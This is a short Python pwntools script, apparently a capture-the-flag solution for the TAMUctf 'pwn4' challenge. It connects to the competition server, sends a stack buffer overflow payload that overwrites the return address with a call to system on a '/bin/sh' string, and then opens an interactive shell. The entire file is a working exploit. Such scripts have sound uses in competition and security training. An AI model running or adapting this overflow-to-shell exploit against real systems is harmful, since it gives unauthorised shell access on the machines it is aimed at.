#!/usr/bin/env python
# -*- coding: utf-8 -*-
# 
from pwn import *
#context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

elf = ELF('./pwn4')
io = remote('pwn.tamuctf.com', 4324)
# io = process('./pwn4')
binsh = 0x0804a034
payload = 'a' * (0x21+4)
payload += p32(elf.sym['system']) + 'aaaa' + p32(binsh)
io.sendlineafter('ls:\n', payload)
io.interactive()
